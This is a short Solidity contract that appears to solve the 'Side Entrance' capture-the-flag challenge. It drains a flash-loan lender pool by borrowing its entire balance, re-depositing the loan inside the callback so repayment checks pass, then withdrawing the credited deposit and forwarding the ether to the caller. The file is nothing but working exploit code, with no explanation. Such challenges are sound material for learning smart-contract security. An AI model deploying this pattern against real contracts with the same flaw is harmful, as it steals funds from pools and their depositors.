// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Flush {
    receive() external payable {}

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function pipe(address pool) external {
        SideEntranceLenderPool(pool).flashLoan(pool.balance);
        SideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
